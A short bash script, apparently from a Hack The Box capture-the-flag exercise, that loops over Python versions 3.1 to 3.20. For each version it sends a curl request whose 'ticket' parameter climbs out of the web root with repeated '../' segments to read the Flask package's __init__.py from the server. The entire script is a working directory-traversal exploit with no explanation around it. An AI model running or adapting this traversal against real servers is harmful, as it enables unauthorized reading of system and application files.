#!/bin/bash 

for i in {1..20}; do
  url="http://titanic.htb/download?ticket=../../../../../../../../usr/lib/python3.$i/site-packages/Flask/__init__.py"
  response=$(curl -s  "$url")
  
  echo "$response"
done

